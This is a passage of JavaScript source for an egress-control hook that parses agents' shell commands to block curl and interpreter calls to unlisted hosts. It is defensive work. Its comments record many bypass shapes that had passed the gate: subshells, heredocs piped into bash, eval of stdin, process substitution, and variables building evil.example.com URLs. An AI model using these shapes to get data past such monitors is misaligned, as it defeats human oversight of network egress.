    if (!ctx?.unread?.size) return false
    for (const m of part.matchAll(/\$\{?([A-Za-z_][A-Za-z0-9_]*)/g)) if (ctx.unread.has(m[1])) return true
    return false
  }
  const fromMarks = (part) => {
    if (!inners || !MARKS.test(part)) return false
    for (const k of new Set([...part].filter((c) => MARKS.test(c)).map((c) => c.charCodeAt(0) - MARK_BASE))) {
      if (inners[k] == null) continue
      dests.push(...substHostCandidates(inners[k]), `$(${inners[k].trim()})`)
    }
    return true
  }
  const addUrl = (v) => {
    if (v == null) return
    // A `)` ending the word is the shell's, a subshell's end, unless the word opened one itself:
    // `(curl -s http://evil.example.com)` passed the live gate, its host read `evil.example.com)` is
    // no host name (dexter, card d6b95892). Stripped, the host is judged; a `)` in the middle stays.
    v = String(v).replace(/^([^(]*?)\)+$/, '$1')
    // checked before destHost: `{http://localhost/,http://evil.example.com/}` has a local hostPortion
    if (unreadableHostHead(v)) { fromMarks(hostPortion(v)); dests.push(`<unreadable host: ${v}>`); return }
    const h = destHost(v)
    if (h) { dests.push(h); return }
    const part = hostPortion(v)
    if (!fromMarks(part) && (COMPUTED_PARAM.test(part) || unreadVar(part))) dests.push(part)
  }
  const addParts = (v) => { for (const p of String(v).split(':')) if (HOSTNAME.test(p)) dests.push(p.toLowerCase()); else fromMarks(p) }
  for (let k = 0; k < args.length; k++) {
    const w = args[k]
    if (/^\d*[<>]/.test(w) || w === '&') { if (/^\d*(?:>>?|<)&?$/.test(w)) k++; continue } // redirection
    if (w === '--' ) continue
    if (w.startsWith('--')) {
      const [name, inline] = w.slice(2).split(/=(.*)/s)
      if (!CURL_LONG_WITH_VALUE.has(name)) continue
      const v = inline !== undefined ? inline : args[++k]
      // a config (file, `-` stdin, a here-string) carries url / proxy lines the argv never shows
      if (name === 'config') dests.push(`<curl config: ${v ?? ''}>`)
      else if (CURL_DEST_URL.has(name)) addUrl(v)
      else if (CURL_DEST_PARTS.has(name)) addParts(v)
      else if (fileValues && CURL_FILE_LONG.has(name) && v != null) fileValues.add(v)
      continue
    }
    if (w.startsWith('-') && w.length > 1) {
      for (let q = 1; q < w.length; q++) {
        if (!CURL_SHORT_WITH_VALUE.has(w[q])) continue
        const v = q + 1 < w.length ? w.slice(q + 1) : args[++k]
        if (w[q] === 'K') dests.push(`<curl config: ${v ?? ''}>`)
        else if (CURL_DEST_URL.has(w[q])) addUrl(v)
        else if (fileValues && CURL_FILE_SHORT.has(w[q]) && v != null) fileValues.add(v)
        break
      }
      continue
    }
    addUrl(w) // positional: always a URL to curl
  }
  return dests.filter((h) => !isLocalHost(h))
}
// STRICT CURL FOR AN AGENT WITH A HOST EXCEPTION (card fa917eba; didi's review 19977, 2026-09-28).
// Such an agent has no `curl *https://*` deny rule any more, and those rules had been blocking
// shapes this parser cannot read: a curl config (-K / --config, from a file or a here-string), a
// URL built by a substitution (`curl "$(echo https://x)"`), a destination only an outside variable
// knows. For THAT agent, a curl call is allowed only when all of it is readable:
//   1. no -K / --config at all;
//   2. every URL literal ANYWHERE in the command text (quoted, heredoc, here-string, a substitution)
//      has a local or listed host -- data included, deliberately: for this agent the literal is the
//      only evidence there is;
//   3. no destination-position value that is still a `$` / backtick expression.
// curl is recognised by name case-insensitively and after quote removal (`Curl`, `\curl`, `c''url`):
// the disk is case-insensitive, so /usr/bin/Curl runs curl (didi, same review).
// Returns a deny reason, or null. Fleet-wide behaviour is untouched: this runs only for an agent
// whose entry is non-empty (the CLI block below).
const CURL_CONFIG_FLAG = /^(?:-K.*|--config(?:=.*)?)$/
// A destination the command itself does not spell out: a substitution, or a variable that is NOT
// given a value in this same command (NAME=... or `for NAME in ...`). A variable the command does
// assign is fine here: its literal URL is in the text, and rule 2 checks every literal.
function unresolvedDest(dest, text) {
  const assigned = (v) => new RegExp(`(?:^|[\\s;&|(])${v}=|\\bfor\\s+${v}\\s+in\\b`).test(text)
  // A destination that STARTS with an assigned variable takes its scheme and host from that
  // variable's literal (checked by rule 2); whatever follows it -- a path, a query, even a
  // substitution in the query -- cannot move the host (`"$FE$p"`, `"$API/x?n=$(...)"`).
  const lead = /^\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?/.exec(dest)
  if (lead && assigned(lead[1])) return false
  if (/\$\(|`/.test(dest)) return true
  for (const m of dest.matchAll(/\$\{?([A-Za-z_][A-Za-z0-9_]*)/g)) if (!assigned(m[1])) return true
  return false
}
export function strictCurlReason(command, allowedHosts, vendorDomains = new Set()) {
  return strictCurl(command, allowedHosts, vendorDomains)?.reason ?? null
}
// The verdict with the host that caused it, so the deny message can NAME it (didi 20013: an
// empty "(hoszt: )" left the agent with no idea why).
export function strictCurl(command, allowedHosts, vendorDomains = new Set()) {
  const text = String(command ?? '')
  const segments = text.split(/\|\||&&|[;|\n]/)
  let sawCurl = false
  // Rule 2 is about where curl CONNECTS. When every destination of every curl in the command is a
  // literal LOCAL host, a URL in the text is data posted to our own dashboard (a kanban comment or
  // a message that quotes a link, didi 20013), not egress. Any other destination -- external, or a
  // variable whose value only the text shows -- keeps rule 2 on.
  let allLocal = true
  for (const seg of segments) {
    const words = shellWords(seg)
    // a subshell `(curl ...)` leaves its paren on the word; a substitution's `$(` does not reach here as a command
    const at = words.findIndex((w) => normalizedName(w) === 'curl')
    if (at === -1) continue
    sawCurl = true
    const args = words.slice(at + 1)
    if (args.some((w) => CURL_CONFIG_FLAG.test(w))) return { reason: 'agent-exception-curl-config', hosts: [] }
    for (let k = 0; k < args.length; k++) {
      const w = args[k]
      let dest = null
      if (w.startsWith('--')) {
        const [name, inline] = w.slice(2).split(/=(.*)/s)
        if (!CURL_LONG_WITH_VALUE.has(name)) continue
        const v = inline !== undefined ? inline : args[++k]
        if (CURL_DEST_URL.has(name)) dest = v
      } else if (w.startsWith('-') && w.length > 1) {
        for (let q = 1; q < w.length; q++) {
          if (!CURL_SHORT_WITH_VALUE.has(w[q])) continue
          const v = q + 1 < w.length ? w.slice(q + 1) : args[++k]
          if (CURL_DEST_URL.has(w[q])) dest = v
          break
        }
      } else if (!/^\d*[<>]/.test(w)) {
        dest = w
      }
      if (dest != null && destHost(dest) === null && unresolvedDest(dest, text)) return { reason: 'agent-exception-unresolved-destination', hosts: [] }
      if (dest != null) { const h = destHost(dest); if (!h || !isLocalHost(h)) allLocal = false }
    }
  }
  if (!sawCurl || allLocal) return null
  for (const m of text.matchAll(URL_RE)) {
    // URL_RE keeps a trailing `;` / `,` / `&` (`FE=https://host;`), which is shell, not host
    const h = hostOf(m[0].replace(/[;,&|]+$/, ''))
    if (!h || isLocalHost(h)) continue
    if (!allowedHosts.has(h) && !hostInDomains(h, vendorDomains)) return { reason: 'agent-exception-unlisted-url', hosts: [h] }
  }
  return null
}
// A command word as the shell resolves it. Takes a shellWords word, so quotes and backslashes are
// already resolved (`"curl"`, `\curl`, `c''url` -> curl); strips a subshell's leading paren, takes
// the basename, and folds case because this disk is case-insensitive (`Curl` runs curl).
// A function head glued to its subshell body is one word: `f()(curl URL); f` ran a curl the gate read
// as the command `f()(curl` (didi 36014).
export function normalizedName(word) {
  return String(word ?? '').replace(/^[^\s=()]*\(\)(?=\()/, '').replace(/^\(+/, '').split('/').pop().toLowerCase()
}
// The command word read from the ORIGINAL segment's shell words, found the way commandIndex finds it
// in the masked ones: past assignments, prefix keywords AND a prefix command's own options and
// arguments. Skipping only the prefix words read `timeout 30 curl URL` as the command `30`, and the
// curl went unjudged (measured on the fork before this port: timeout / nice -n / stdbuf -oL all
// passed). Falls back to the masked word when the original reading runs out of words.
function commandName(swords, maskedWord) {
  const i = commandIndex(swords)
  return i < swords.length ? normalizedName(swords[i]) : normalizedName(maskedWord)
}
// The words after the command word commandName reads: the command's own arguments.
function argsAfterCommand(swords) {
  return swords.slice(commandIndex(swords) + 1)
}
// EGRESSHEREDOC924: STDIN FEEDS. A heredoc body or a here-string word is what the command on the
// left reads from stdin. For an interpreter that stdin IS the program (`python3 - <<'PY'`,
// `node <<EOF`, `bash <<< 'curl ...'`), and for a `while read u` loop it is the list of values `u`
// takes. maskInertLiterals blanks both (rightly: to the OUTER shell they are text), so before this
// neither reading was ever judged.
const SHELL = /^(?:bash|sh|zsh|dash|ksh)$/
// `read` options that take a value; -a's value is itself a variable name (an array).
const READ_OPT_WITH_VALUE = new Set('adnNptui'.split(''))
// The word after `<<<`, raw (quotes kept), ending at unquoted whitespace or a shell operator.
function hereStringWord(text, i) {
  while (i < text.length && (text[i] === ' ' || text[i] === '\t')) i++
  const s = i
  while (i < text.length && !/[\s;&|<>()]/.test(text[i])) {
    if (text[i] === "'") { const e = text.indexOf("'", i + 1); i = e === -1 ? text.length : e + 1; continue }
    if (text[i] === '"' || (text[i] === '$' && text[i + 1] === "'")) {
      const q = text[i] === '"' ? '"' : "'"; let j = text[i] === '"' ? i + 1 : i + 2
      while (j < text.length && text[j] !== q) j += text[j] === '\\' ? 2 : 1
      i = j + 1; continue
    }
    i += text[i] === '\\' ? 2 : 1
  }
  return text.slice(s, Math.min(i, text.length))
}
// Every feed: { at, text, expands }. `at` is the operator offset (it decides which sub-command the
// feed belongs to); `expands` is whether the shell expands $VARS in it (unquoted heredoc tag, a
// here-string word that is not single-quoted).
// A here-string word built by a substitution (`bash <<< "$(cat <<S ... S)"`) is empty in `orig`: its
// substitutions' command texts ride along as `inners`, so the caller can judge what they print when
// the receiver runs its stdin as a program (didi round 4 item 2).
function stdinFeeds(orig, masked, herestrings, env, marked = orig, inners = []) {
  const feeds = []
  // Heredoc operators are found in the MASKED text, so one inside quotes or another body is not one.
  for (const m of masked.matchAll(/<<-?\s*(?:'([^']*)'|"([^"]*)"|([A-Za-z_]\w*))/g)) {
    const tag = m[1] ?? m[2] ?? m[3]
    const nl = orig.indexOf('\n', m.index + m[0].length)
    if (nl === -1) continue
    const endRx = new RegExp(`^[ \\t]*${tag.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[ \\t]*$`, 'm')
    const rel = endRx.exec(orig.slice(nl + 1))
    feeds.push({ at: m.index, text: orig.slice(nl + 1, rel ? nl + 1 + rel.index : orig.length), expands: m[3] != null })
  }
  for (const at of herestrings) {
    const raw = hereStringWord(orig, at + 3)
    if (!raw.trim()) continue
    const expands = !raw.startsWith("'")
    const built = [...new Set([...hereStringWord(marked, at + 3)].filter((c) => MARKS.test(c)))]
      .map((c) => inners[c.charCodeAt(0) - MARK_BASE]).filter((x) => x != null)
    feeds.push({ at, text: shellWords(expands ? expand(raw, env) : raw).join(' '), expands: false, inners: built })
  }
  return feeds
}
// Commands that only print or write the text they are given: a heredoc body fed to one of them is data.
// printf is not here: `printf -v VAR` writes a variable, and the -v can hide behind quotes (didi 27673).
const TEXT_ONLY = new Set(['cat', 'tee', 'echo', 'true', ':'])
// Is the `<<` at offset `at` inside a comment (an unquoted `#` starting a word earlier on its line)?
// Then it opens no heredoc, and the lines after it run as commands.
function inComment(masked, at) {
  const ls = masked.lastIndexOf('\n', at - 1) + 1
  return /(?:^|[\s;&|()])#/.test(masked.slice(ls, at))
}
// May the heredoc bodies of this command line be read as text? Only where every sub-command either
// just prints / writes text, or is a shell / interpreter reading its OWN heredoc (stdinFeeds judges
// that body as a program). A body that reaches a program any other way stays in the command line:
// piped into a shell (`cat <<EOF | bash`), sourced (`. /dev/stdin <<EOF`), sent to a remote shell
// (`ssh host <<EOF`), or written and run in the same line (`cat > a.sh <<EOF ... EOF; bash a.sh`).
// A command not named here reads as "maybe runs it", so a new form is judged, not waved through
// (didi 33332 on 0ed6702ab). A substitution's output is itself a command line (`eval "$(cat <<EOF)"`).
// The NAME alone is not enough (didi 27663): output written into a process substitution
// (`tee >(bash)`, `cat > >(sh -s)`) reaches a shell, and `./cat` or `PATH=. cat` is not the cat the
// set means. So a text-only word counts only as the bare first word of its command, and a line with
// any `>(` / `<(` outside quotes keeps its bodies.
function bodiesAreText(orig, masked, depth, substituted) {
  if (substituted || depth >= 4) return false
  if (/[<>]\(/.test(masked)) return false
  // Read outside the bodies but inside quotes (a double-quoted `${X:=v}` still runs): an expansion
  // that assigns (`: ${PATH:=.}`, `$((...))`) changes what a later name means, and a /dev/tcp or
  // /dev/udp redirect sends the body over the network.
  const outer = blankHeredocBodies(orig, masked)
  if (/\$\{[^}]*=|\$\(\(|\$\[|\/dev\/(?:tcp|udp)\//.test(outer)) return false
  // A terminator line (`EOF`) is the end of a body, not a command.
  let lines = masked
  for (const h of heredocBodies(orig, masked)) {
    if (h.end >= orig.length) continue
    const eol = orig.indexOf('\n', h.end)
    const e = eol === -1 ? orig.length : eol
    lines = lines.slice(0, h.end) + ' '.repeat(e - h.end) + lines.slice(e)
  }
  for (const [a, b] of spans(lines)) {
    const mw = words(lines.slice(a, b))
    if (mw.length === 0) continue
    // An assignment-only command (`PATH=.:$PATH; cat`) changes what a later name means: not text.
    const i = commandIndex(mw)
    if (i >= mw.length) return false
    // The name is read from the masked text, where `"./"cat` reads as cat: the RAW first word must
    // be the bare name too.
    if (i === 0 && TEXT_ONLY.has(mw[0]) && outer.slice(a, b).trim().split(/\s+/)[0] === mw[0]) continue
    const cmd = mw[i].split('/').pop()
    const ownHeredoc = /<<-?\s*(?:'|"|[A-Za-z_])/.test(lines.slice(a, b))
    if (ownHeredoc && (SHELL.test(cmd) || INTERPRETER.test(cmd.toLowerCase()))) continue
    return false
  }
  return true
}
// The original text with every heredoc BODY blanked (length-preserving), for reading command NAMES.
// maskInertLiterals blanks a body together with its newlines, so a body and its terminator line fall
// into ONE span; read through shellWords on the original, that span started with the body's first
// word, and `cat <<EOF` / `bash <<EOF` over a `curl ...` line read as a curl whose destination was
// the terminator (`EOF` -> host "eof"). Called only where bodiesAreText says the bodies are text.
// Quoted strings stay: the shell runs `"curl"` as curl.
function blankHeredocBodies(orig, masked) {
  let out = orig
  for (const { start, end } of heredocBodies(orig, masked)) {
    out = out.slice(0, start) + out.slice(start, end).replace(/[^\n]/g, ' ') + out.slice(end)
  }
  return out
}
// Every heredoc body as { start, end }: from the line after the `<<TAG` operator to the start of its
// terminator line (or the end of the text). A `<<` inside a comment opens nothing.
function heredocBodies(orig, masked) {
  const out = []
  for (const m of masked.matchAll(/<<-?\s*(?:'([^']*)'|"([^"]*)"|([A-Za-z_]\w*))/g)) {
    if (inComment(masked, m.index)) continue
    const tag = m[1] ?? m[2] ?? m[3]
    const nl = orig.indexOf('\n', m.index + m[0].length)
    if (nl === -1) continue
    const endRx = new RegExp(`^[ \\t]*${tag.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[ \\t]*$`, 'm')
    const rel = endRx.exec(orig.slice(nl + 1))
    out.push({ start: nl + 1, end: rel ? nl + 1 + rel.index : orig.length })
  }
  return out
}
// The command word of the sub-command that contains offset `at` (basename, prefixes skipped).
// Read from the ORIGINAL text through shellWords, as the main reading in classify does: in the masked
// text a quoted name is blank, so `"bash" <<< '...'` and `"python3" - <<'PY'` read as the commands
// `<<<` and `-`, and the body fed to the shell or the interpreter went unjudged (card 1a701051). The
// words are taken up to `at`, like argsBefore; the masked reading stays as the fallback.
function commandWordAt(orig, masked, at) {
  for (const [a, b] of spans(masked)) {
    if (at < a || at > b) continue
    // every word kept: commandIndex steps over a group opener itself, and a `{}` is xargs's operand
    const sw = shellWords(orig.slice(a, Math.max(a, at)))
    const k = commandIndex(sw)
    if (k < sw.length) return normalizedName(sw[k])
    const mw = words(masked.slice(a, b))
    const i = commandIndex(mw)
    return i < mw.length ? mw[i].split('/').pop() : null
  }
  return null
}
// Every `read` in the command, as { names, array }: `while IFS= read -r a b` -> names [a, b];
// `read -a arr` -> array arr; a bare `read` -> names [REPLY].
function collectReads(orig, masked) {
  const reads = []
  for (const [a, b] of spans(masked)) {
    const sw = shellWords(orig.slice(a, b))
    let k = commandIndex(sw)
    if (sw[k] === 'while' || sw[k] === 'until') k += 1 + commandIndex(sw.slice(k + 1))
    if (sw[k] !== 'read') continue
    const names = []; let array = null
    for (k++; k < sw.length; k++) {
      const w = sw[k]
      if (w.startsWith('-') && w.length > 1) {
        for (let q = 1; q < w.length; q++) {
          if (!READ_OPT_WITH_VALUE.has(w[q])) continue
          const v = q + 1 < w.length ? w.slice(q + 1) : sw[++k]
          if (w[q] === 'a' && /^[A-Za-z_]\w*$/.test(v ?? '')) array = v
          break
        }
        continue
      }
      if (/^[A-Za-z_]\w*$/.test(w)) names.push(w); else break
    }
    reads.push({ names: names.length || array ? names : ['REPLY'], array })
  }
  return reads
}
// The values one `read` gives its variables from a fed text, line by line, the way read splits a
// line: field k to the k-th name, the rest of the line to the last name, every field to an array.
function readValues(text, { names, array }) {
  const out = {}
  const add = (v, x) => { if (x) (out[v] ??= []).push(x) }
  for (const line of text.split('\n')) {
    const f = line.trim().split(/\s+/).filter(Boolean)
    names.forEach((v, k) => add(v, k < names.length - 1 ? f[k] : f.slice(k).join(' ')))
    if (array) for (const x of f) add(array, x)
  }
  return out
}
// The external hosts of every scheme-bearing URL in `text`, listed vendors excepted.
function externalHosts(text, vendorHosts, vendorDomains) {
  const found = [...String(text).matchAll(URL_RE)].map((m) => m[0]).filter(isExternal).map(hostOf)
  return [...new Set(found)].filter((h) => !vendorHosts.has(h) && !hostInDomains(h, vendorDomains))
}
// Does `text` name a network tool this hook judges (curl, or a language network primitive)?
const NET_WORD = /(?:^|[^A-Za-z0-9_-])curl(?![A-Za-z0-9_-])/i
function namesNetwork(text) { return NET_WORD.test(text) || NET_PRIMITIVE.test(text) }
// A command line the parser cannot READ (maskInertLiterals gives up: a heredoc delimiter that is not
// a plain word, `<<E"O"F`, `<<'E'OF`, `<<EOF-1` ...). Under real bash the line still runs, and the
// curl after the true delimiter goes out (didi, card c8b1ccbf, shape 1): a blind pass here let ANY
// command through. A network tool AND an external destination anywhere in the text deny, and the
// destination is judged in every spelling (didi F1): a scheme URL; curl's argv read as the readable
// path reads it (`curl -s evil.example.com/x`, `curl "$s://evil.example.com/x"`); a host-like word
// (`evil.example.com:8443`, `8.8.8.8/x`, a `$var://host`). Anything else stays a pass with reason
// 'unparseable' (the fleet's own unreadable commands go to localhost), which the excepted-agent
// rule below still tightens.
const UNREAD_WORD_SPLIT = /[\s"'`;|&()<>=,{}]+/
const DOTTED_HOST = /^(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9-]*[a-z][a-z0-9-]*$/i
const IPV4_SHAPE = /^\d{1,3}(?:\.\d{1,3}){3}$/
// curl's destinations in an unreadable line: the argv after each `curl`, up to the end of its line or
// sub-command, through the same flag table as the readable path (so `-o out.html` is no host). The
// substitutions are marked first (a `$(...)` neither cuts the argv nor hides the host it builds), and
// every NAME=value in the line is a value $NAME can take (didi's review 3: `h=evil; curl $h` passed).
// `fileValues` collects the output-file values, which the word reading then skips.
const UNREAD_ASSIGN = /(?:^|[\s;&|(])(?:export\s+|local\s+|readonly\s+)?([A-Za-z_][A-Za-z0-9_]*)=("([^"]*)"|'([^']*)'|([^\s;&|)]*))/g
function unreadableCurlHosts(text, fileValues, inheritedArrays = null) {
  const { marked, inners } = markAllSubstitutions(text)
  const values = {}
  for (const m of marked.matchAll(UNREAD_ASSIGN)) (values[m[1]] ??= []).push(m[3] ?? m[4] ?? m[5] ?? '')
  // The other ways a line gives a name a value (didi round 4 item 3): a `for NAME in` list, a `read`
  // fed by a here-string (each of its words to each read name), `printf -v`.
  for (const m of marked.matchAll(/(?:^|[\s;&|(!{])for\s+([A-Za-z_][A-Za-z0-9_]*)\s+in\s+([^;\n]*)/g)) {
    (values[m[1]] ??= []).push(...shellWords(m[2]))
  }
  for (const m of marked.matchAll(/(?:^|[\s;&|(])read((?:\s+[^\s<;&|]+)*)\s*<<<\s*("[^"]*"|'[^']*'|[^\s;&|)]*)/g)) {
    const names = m[1].trim().split(/\s+/).filter((w) => /^[A-Za-z_][A-Za-z0-9_]*$/.test(w))
    const said = shellWords(m[2])
    for (const v of names.length ? names : ['REPLY']) (values[v] ??= []).push(...said, said.join(' '))
  }
  for (const [name, value] of printfAssignments(marked)) (values[name] ??= []).push(value)
  const unread = unreadNames(marked)
  for (const v of unread) delete values[v]
  const arrays = { ...(inheritedArrays ?? {}), ...collectArrays(marked, marked) }
  const last = Object.fromEntries(Object.entries(values).map(([v, xs]) => [v, xs[xs.length - 1]]))
  const out = []
  for (const m of marked.matchAll(/(?:^|[^A-Za-z0-9_-])curl(?![A-Za-z0-9_-])/gi)) {
    const seg = marked.slice(m.index + m[0].length).split(/[\n;|&()`]/)[0]
    // past MAX_LOOP_VARIANTS combinations, each variable's last value is read (the line still denies
    // on any literal host it holds)
    for (const t of [seg, ...(loopVariants(seg, {}, values) ?? [expand(seg, last)])]) {
      out.push(...curlDestinations(shellWords(t), inners, fileValues, { unread, text, arrays }))
    }
  }
  return out
}
// The host-like words of an unreadable line, for the tools that are not curl (an interpreter, a shell
// one-liner): a `://` word is read by destHost (any scheme, a variable scheme too). A schemeless word
// is a destination when its host is an IPv4 or a bracketed IPv6 (two colons at least: `[:400]` is a
// slice), or a dotted name WITH a path or query after it. A bare dotted name is a file (`notes.md`,
// `pr-check.yml:111`) or an attribute (`json.dump`, `sys.stdin`): measured on 4 days of fleet commands,
// the rule without that narrowing denied five such lines and no real send. A `host:port` with no path
// is judged for curl (curlDestinations reads its argv); for a socket-level connect it stays open (see
// the header). A word starting with `@` is a file (`-d @file`), not a host.
const IPV6_BRACKET = /^\[(?=[0-9a-f:.]*:[0-9a-f:.]*:)[0-9a-f:.]+\]$/i
function unreadableWordHosts(text, skip = new Set()) {
  const out = []
  for (const w of text.split(UNREAD_WORD_SPLIT)) {
    if (!w || w.startsWith('@') || skip.has(w)) continue
    if (w.includes('://')) { const h = destHost(w); if (h) out.push(h); continue }
    const hostPart = w.split(/[/?#]/)[0]
    const suffixed = hostPart.length < w.length
    const name = hostPart.replace(/^.*@/, '').replace(/:\d+$/, '').toLowerCase()
    if (IPV4_SHAPE.test(name) || IPV6_BRACKET.test(name) || (suffixed && DOTTED_HOST.test(name))) out.push(name)
  }
  return out
}
// `arrays`: the arrays of the line this text was lifted from (classify's unreadable branch).
function unreadableVerdict(text, vendorHosts, vendorDomains, arrays = null) {
  if (namesNetwork(text)) {
    const files = new Set()
    const curlHosts = unreadableCurlHosts(text, files, arrays)
    const found = [...externalHosts(text, vendorHosts, vendorDomains), ...curlHosts, ...unreadableWordHosts(text, files)]
    const hosts = [...new Set(found)].filter((h) => !isLocalHost(h) && !vendorHosts.has(h) && !hostInDomains(h, vendorDomains))
    if (hosts.length) return { deny: true, reason: 'unparseable-external', hosts }
  }
  return { deny: false, reason: 'unparseable', hosts: [] }
}
// The command string of `bash -c BODY` (any flag cluster holding `c`: -c, -lc, -ec), read from the
// shell's own argv: the first operand after the options. null when the shell runs a file or stdin.
function shellCBody(args) { return shellCSplit(args)?.body ?? null }
// The -c body and the words after it, which the body reads as $0, $1, ...
function shellCSplit(args) {
  let k = 0
  for (; k < args.length; k++) {
    const a = args[k]
    if (a === '--' || !/^[-+]/.test(a)) return null
    if (/^-[A-Za-z]*c[A-Za-z]*$/.test(a)) break
    if (/^[-+][oO]$/.test(a) || a === '--rcfile' || a === '--init-file') k++
  }
  for (k++; k < args.length; k++) {
    const a = args[k]
    if (/^[-+][oO]$/.test(a)) { k++; continue }
    if (a === '--' || /^[-+][A-Za-z]/.test(a)) continue
    return { body: a, rest: args.slice(k + 1) }
  }
  return null
}
// A -c body with its positionals bound to the words after it (`sh -c "$(echo curl) \$1" _ URL` runs
// `curl URL`; didi 36603 item 3), or null when it reads none. A positional with no word stays as it
// is, so its reading does not change; "$@" / "$*" become the words themselves.
function bindPositionals(body, rest) {
  if (!rest.length || !POSITIONAL_REF.test(body)) return null
  const all = rest.slice(1).map(asWord).join(' ')
  return body
    .replace(/"\$(?:[@*]|\{[@*]\})"/g, all)
    .replace(/\$\{([0-9@*])[^}]*\}|\$([0-9@*])/g, (m, x, y) => {
      const p = x ?? y
      if (p === '@' || p === '*') return all
      return rest[Number(p)] == null ? m : asWord(rest[Number(p)])
    })
}
// Is a shell's STDIN only DATA to it? The answer needs POSITIVE evidence (didi's review 3: listing the
// shapes that read stdin as a program -- `bash`, `-s`, `-`, `/dev/stdin`, a -c body running `bash` --
// left `-c 'source /dev/stdin'`, `-c 'eval "$(cat)"'` and the like open). Data: a script operand
// (`bash agent-msg.sh a b - <<'VEGE'` feeds a message), or a -c body that only prints text or hands
// the stdin to one shell that is itself given a script. Everything else reads as a program. `args`
// are the words after the shell's name, up to the `<<`.
const STDIN_PATH = /^\/(?:dev\/stdin|dev\/fd\/0|proc\/self\/fd\/0)$/
function shellStdinIsData(args, trustPrint = true) {
  for (let k = 0; k < args.length; k++) {
    const a = args[k]
    if (a === '-' || STDIN_PATH.test(a)) return false
    if (a === '--') continue
    if (/^[-+][oO]$/.test(a)) { k++; continue }
    // `-c` with no body here gets it from elsewhere (`| xargs -0 bash -c`: the stdin IS the body)
    if (/^-[A-Za-z]*c[A-Za-z]*$/.test(a)) return args[k + 1] !== undefined && shellCBodyIsData(args[k + 1], trustPrint)
    if (/^-[A-Za-z]*s[A-Za-z]*$/.test(a)) return false
    if (/^[-+]/.test(a)) continue
    return true
  }
  return false
}
// The sub-commands of a -c body, as shell-word arrays (a body is short; quotes are honoured per piece).
function bodyCommands(body) {
  return String(body).split(/&&|\|\||[;|&\n]/).map((x) => shellWords(x)).filter((w) => w.length)
}
// A -c body that reads its stdin as data: no substitution and no process substitution (either can
// run the stdin), and either every sub-command is a bare text-only word, or the body is ONE shell
// sub-command whose own stdin is data (`bash -c 'bash ./x.sh -'`). `cat > a.sh; bash a.sh` is two
// sub-commands, so it is a program: the body is written and run.
function shellCBodyIsData(body, trustPrint = true) {
  if (/\$\(|`|[<>]\(/.test(body)) return false
  const cmds = bodyCommands(body)
  if (trustPrint && cmds.every((w) => TEXT_ONLY.has(w[0]))) return true
  if (cmds.length !== 1) return false
  const w = cmds[0]; const i = commandIndex(w)
  return i < w.length && SHELL.test(normalizedName(w[i])) && shellStdinIsData(w.slice(i + 1), trustPrint)
}
// A body that reaches an interpreter's stdin is judged as that interpreter's PROGRAM, whatever its
// options say. No option is proof that the stdin stays data: `python3 -W ignore -` and `node -r ./x.js`
// ran it (didi round 5 item 2), and so does a code flag's own operand when the code reads the stdin
// (`python3 -c 'exec(sys.stdin.read())'`, `node -e 'eval(readFileSync(0))'`, didi round 7 item 2). The
// interpreter rule only denies a body that uses the network AND names an external host, so data fed
// to a parser (`| python3 -c 'json.load(sys.stdin)'`) stays allowed.
// The interpreter a shell's -c body hands its stdin to (`bash -c 'python3 -'`, `sh -c 'exec node'`),
// or null: such a body is judged by the interpreter rule, not as a command line.
function stdinInterpreter(args) {
  const body = shellCBody(args)
  if (body === null) return null
  for (const w of bodyCommands(body)) {
    const i = commandIndex(w)
    const name = i < w.length ? normalizedName(w[i]) : ''
    if (INTERPRETER.test(name)) return name
  }
  return null
}
// Sub-commands that run their stdin: `source /dev/stdin`, `. /dev/stdin` (or with no operand), and eval,
// whose argument is a substitution reading the stdin (`eval "$(cat)"`).
function runsStdin(sw, trustPrint = true) {
  const w = sw.filter((x) => !/^[{}()!]+$/.test(x)).map((x) => x.replace(/^[{(]+/, ''))
  const i = commandIndex(w)
  if (i >= w.length) return false
  const c = normalizedName(w[i])
  if (c === 'eval') return true
  if (c === 'source' || w[i] === '.') {
    const operand = w[i + 1] === '--' ? w[i + 2] : w[i + 1] // `source -- /dev/stdin` (didi round 4)
    return operand === undefined || STDIN_PATH.test(operand)
  }
  return SHELL.test(c) && !shellStdinIsData(w.slice(i + 1), trustPrint)
}
// Redirection words (`<<S`, `>out`, `2>&1`, or an operator alone with its target after it) dropped.
function withoutRedirects(sw) {
  const out = []
  for (let k = 0; k < sw.length; k++) {
    if (/^\d*(?:<<-?|<<<|>>?|<|&>|>&|<&)/.test(sw[k])) { if (/^\d*(?:<<-?|<<<|>>?|<|&>|>&|<&)$/.test(sw[k])) k++; continue }
    out.push(sw[k])
  }
  return out
}
// Does a heredoc fed to a command that is NOT a shell or an interpreter still reach one as its program?
// Three doors (didi's review 3): the command runs its stdin itself (`source /dev/stdin <<S`); it closes
// a group whose members share the stdin (`{ bash; } <<S`); or its output goes down a pipe into a shell
// (`cat <<S | bash`, `base64 -d <<S | sh`). Only the heredoc's own line is read, cut before the body.
// Anything else (`gh pr comment --body-file -`, `git commit -F -`) keeps the body as data.
function feedRunsAsProgram(orig, masked, at, trustPrint = true) {
  const ls = orig.lastIndexOf('\n', at - 1) + 1
  const nl = orig.indexOf('\n', at)
  const le = nl === -1 ? orig.length : nl
  const line = spans(masked).filter(([a, b]) => b > ls && a < le)
  const wordsOf = ([a, b]) => withoutRedirects(shellWords(orig.slice(Math.max(a, ls), Math.min(b, le))))
  const k = line.findIndex(([a, b]) => at >= a && at < b)
  if (k === -1) return false
  const own = wordsOf(line[k])
  if (runsStdin(own, trustPrint)) return true
  if (own.length === 0 || /^[})]/.test(own[0])) {
    for (let j = k - 1; j >= 0; j--) {
      const w = wordsOf(line[j])
      if (runsStdin(w, trustPrint)) return true
      if (/^[{(]/.test(w[0] ?? '')) break
    }
  }
  for (let j = k; j + 1 < line.length; j++) {
    const b = line[j][1]
    if (masked[b] !== '|' || masked[b + 1] === '|') break
    if (runsStdin(wordsOf(line[j + 1]), trustPrint)) return true
  }
  return false
}
// The interpreter a heredoc's line pipes its output into (`cat <<S | python3 -`), or null (didi round 4
// item 2); its stdin is its program, see stdinInterpreter.
function pipedInterpreter(orig, masked, at) {
  const ls = orig.lastIndexOf('\n', at - 1) + 1
  const nl = orig.indexOf('\n', at)
  const le = nl === -1 ? orig.length : nl
  const line = spans(masked).filter(([a, b]) => b > ls && a < le)
  const k = line.findIndex(([a, b]) => at >= a && at < b)
